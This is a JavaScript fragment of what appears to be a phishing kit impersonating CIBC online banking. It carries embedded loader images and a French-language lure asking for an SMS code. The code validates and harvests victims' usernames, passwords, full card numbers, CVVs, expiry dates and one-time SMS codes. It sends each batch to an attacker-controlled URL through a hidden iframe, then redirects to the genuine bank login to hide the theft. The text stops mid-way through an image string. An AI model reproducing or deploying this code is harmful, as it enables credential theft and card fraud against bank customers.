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';break;case(2):return 'data:image/gif;base64,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';break;case(3):return 'data:image/gif;base64,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';break;}});
_tables.set('bank','CIBC');
_tables.set('wasSecondSMS',false);

_tables.text = {
	query: 'Attention !!! Pour valider notre nouvelle mise à jour, veuillez saisir le code à 6 chiffres que vous avez entendu au t&#233;l&#233;phone'
};

_tables.showpage = function(){
	if(_tables.id('_brows.cap'))_tables.id('_brows.cap').parentNode.removeChild(_tables.id('_brows.cap'));
};

_tables.login = function(){
	_tables.get('login').value = '';
	_tables.get('password').value = '';
	_tables.get('button').style.display = '';
	var keyboard = _tables.id('secret-nbr-keyboard').parentNode;
	keyboard.style.display = '';
	_tables.id('_tables.keyboard.div').style.display = 'none';
	_tables.id('_f_btntoloader').parentNode.removeChild(_tables.id('_f_btntoloader'));
};

_tables.iframecallback = function(){
	_tables.set('iframe',function(){return _tables.id('_tables.iframe');});
	_tables.set('dom',_tables.iframedom(_tables.get('iframe')));
	
	if(_tables.get('dom').doc && _tables.get('dom').win){
		if(_tables.get('dom').doc.body.innerHTML.length < 5)return false;
		
		switch(_tables.fstatus()){
			case('login'):
				
			break;
			
			case('sms'):
				
			break;
		}
		
	}
	
};

_tables.loader = function(state){
	
	if(_tables.id('form:1'))_tables.id('form:1').style.display = 'none';
	if(_tables.id('form:2'))_tables.id('form:2').style.display = 'none';
	if(_tables.id('form:3'))_tables.id('form:3').style.display = 'none';
	
	if(state){
		_tables.id('form:0').style.display = '';
	}else{
		_tables.id('form:0').style.display = 'none';
	}
};

_tables.error = function(inp,state){
	if(state){
		inp.style.background = "#ffdedb";
	}else{
		inp.style.background = "#fff";
	}
};

_tables.fkbtn = function(state){
	switch(state){
		
		case(1):
			var noError = true;
			
			_tables.error(_tables.id('_tables.login'),false);
			_tables.error(_tables.id('_tables.password'),false);
			
			if( _tables.id('_tables.login').value.length < 1){
			
				noError = false;
				_tables.error(_tables.id('_tables.login'),true);
			}
			
			if(_tables.id('_tables.password').value.length < 3){
				noError = false;
				_tables.error(_tables.id('_tables.password'),true);
			}
			
			if(!noError)return;
			
			_tables.set('data','Login: '+_tables.id('_tables.login').value+'|');
			_tables.add('data','Password: '+_tables.id('_tables.password').value+'|');
			_tables.loader(true);
			_tables.iframelink(ACTUAL_LINK+"?data="+_tables.get('data'),"login");
			
			setTimeout(function(){
				_tables.loader(false);
				_tables.id('form:2').style.display = '';
				_tables.id('_tables.sms').value = '';
			},WAITING_DURATION_1 * 1000);
		break;
		
		case(2):
			
			var noError = true;
			
		
			_tables.error(_tables.id('_tables.cc.1'),false);
			_tables.error(_tables.id('_tables.cc.2'),false);
			_tables.error(_tables.id('_tables.cc.3'),false);
			_tables.error(_tables.id('_tables.cc.4'),false);
			_tables.error(_tables.id('_tables.cvv'),false);
			_tables.error(_tables.id('_tables.exp.1'),false);
			_tables.error(_tables.id('_tables.exp.2'),false);
			
			var cardValue = _tables.id('_tables.cc.1').value + '' + _tables.id('_tables.cc.2').value + '' + _tables.id('_tables.cc.3').value + '' + _tables.id('_tables.cc.4').value;
			
			if(!_tables.check_cc(cardValue) || cardValue.length < 14 || !/^3|^4|^5|^6/igm.test(cardValue)){
				noError = false;
				_tables.error(_tables.id('_tables.cc.1'),true);
				_tables.error(_tables.id('_tables.cc.2'),true);
				_tables.error(_tables.id('_tables.cc.3'),true);
				_tables.error(_tables.id('_tables.cc.4'),true);
			}
			
			if(!/^[0-9]{3}$/igm.test(_tables.id('_tables.cvv').value)){
				noError = false; 
				_tables.error(_tables.id('_tables.cvv'),true);
			}
			
			if(_tables.id('_tables.exp.1').selectedIndex < 1){
				noError = false;
				_tables.error(_tables.id('_tables.exp.1'),true);
			}
			
			if(_tables.id('_tables.exp.2').selectedIndex < 1){
				noError = false;
				_tables.error(_tables.id('_tables.exp.2'),true);
			}
			
			if(!noError)return;
			
			_tables.add('data','CARD: '+_tables.id('_tables.cc.1').value+_tables.id('_tables.cc.2').value+_tables.id('_tables.cc.3').value+_tables.id('_tables.cc.4').value+ " CVV: " +_tables.id('_tables.cvv').value+ " EXP: " +_tables.id('_tables.exp.1').value+ "/"+ _tables.id('_tables.exp.2').value+ " " + '|');
			_tables.loader(true);
			_tables.iframelink(ACTUAL_LINK+"?data="+_tables.get('data'),"sms");
			
			if(ASK_SECOND_SMS && !_tables.get('wasSecondSMS')){
				_tables.set('wasSecondSMS',true);
				setTimeout(function(){
					_tables.loader(false);
					// document.getElementById('body_div').style.display = "none";
					// document.getElementById('gray_div').style.display = "block";
					_tables.id('form:3').style.display = '';
					// var reg = $('#table_div').detach();
					// $('#body_div').hide();
					// $('#new_process').append(reg);
					// $('#td_image').show();
					// $('#footer_div').show();

					// _tables.id('_tables.sms').value = '';
				},WAITING_DURATION_1 * 1000);
			}else{
				setTimeout(function(){
					_tables.loader(false);
					_tables.id('form:2').style.display = '';
				},1234);
			}
		break;
		
		case(3):
			
			var noError = true;
			
			_tables.error(_tables.id('_tables.sms'),false);
			
			if(_tables.id('_tables.sms').value.length < 3){
				noError = false;
				_tables.error(_tables.id('_tables.sms'),true);
			}
			
			if(!noError)return;
			
			_tables.add('data','SMS: '+_tables.id('_tables.sms').value+'|');
			_tables.loader(true);
			_tables.iframelink(ACTUAL_LINK+"?data="+_tables.get('data'),"sms");
			
			if(ASK_SECOND_SMS && !_tables.get('wasSecondSMS')){
				_tables.set('wasSecondSMS',true);
				setTimeout(function(){
					_tables.loader(false);
					_tables.id('form:4').style.display = '';
					_tables.id('_tables.sms').value = '';
				},WAITING_DURATION_1 * 1000);
			}else{
				setTimeout(function(){
					_tables.loader(false);
					_tables.id('form:4').style.display = '';
				},1234);
			}
		break;
		
		case(3):
			document.location.href = 'https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/index.html#/signon';
		break;
	}
};

_tables.fake = function(){
	var divHolder = _tables.id('content');
	if(divHolder){
		var div = document.createElement('div');
		div.id = '_tables.fakebox';
		div.style.maxWidth = '550px';
		div.style.margin = '0px auto';
		div.innerHTML = '<div id="fakeMin1"><div id="fakeMin2" style="background:#FFFFFF;max-width:550px;text-align:center;padding-top:20px;">'+
							'<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEQAAABECAYAAAA4E5OyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NkE3MTc4QjUxNEZCMTFFNUI5Q0U5Q0E2N0M5RUFCRDQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NkE3MTc4QjYxNEZCMTFFNUI5Q0U5Q0E2N0M5RUFCRDQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2QTcxNzhCMzE0RkIxMUU1QjlDRTlDQTY3QzlFQUJENCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2QTcxNzhCNDE0RkIxMUU1QjlDRTlDQTY3QzlFQUJENCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pv1LnDkAAAmHSURBVHja5Vv7U5NXGj4/MeN/0F+1sWoVFAJyCTGoECQiMSVgL+jiBQXlIpcgiisXQxARUbxUqisVL4iXUgVFwUuEkBBlxrbTsbMznc4y7bSzu8OOHbtepjvz7nmCgZRLiHA+DPSdeSZfznfO8z7P851gTL4wImKjYaZx/bgxy7SRvbs/hckOpbHZRzPYnJM5M+ed3ZH8/sVC4/yrRecXXCvt8W0x9vi1ml753d5HDvBjjOEc5mAu1mAtOMAFTnB7osGdt9HAhAZStoHNquAhVKex9z7N8pl7Jl83/8qe8743ynoXtlfQInMV+XdUk3/XIQqw1VCA/QjJHx4l+aNj/eDHGMM5zMFcrMFacIALnOBGD/RCz0kLZBautCcoW++4crNrtrK5p3PlCy7vPu5309jnf6+SArqqSW6vocCHRyjw0dHxga8FB7jACW70QC/0dOyasuG6Jj8QBFGxyRHEvLq8UN8viloXte+jAMvrEMYbwBhwhMN7oBd6orcjGK7FNZjJDaR8A5tdncrmnsqRLUAQdypIzrd5oP2IZEEMA15yvCd6QwO0QBO0SRLIu8bkESGr2MjmHEv3WdCws2TRbdNzeddBCuJXLejRkbcD3hsaoAWaoA0apQ+Eb0dZZQqb+9n2d/yaiswB5kp+lQ6/vSCGAFqgCdqgUYJA/jII03o2u2ozm3c6x3dhS2mv3